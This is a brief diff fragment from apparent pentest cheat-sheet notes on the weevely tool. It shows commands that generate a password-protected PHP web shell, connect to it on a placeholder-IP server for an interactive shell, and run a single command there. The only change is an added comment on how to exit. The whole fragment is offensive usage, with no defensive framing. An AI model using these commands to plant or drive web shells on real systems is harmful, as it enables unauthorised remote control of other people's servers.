@@ -8,6 +8,7 @@ weevely generate 1234 ./weevley.php
 
 # get webshell
 weevely http://xxx.xxx.xxx.xxx/weevley.php 1234
+# use ctrl-c to exit
 
 # run single command
 weevely http://xxx.xxx.xxx.xxx/weevley.php 1234 whoami
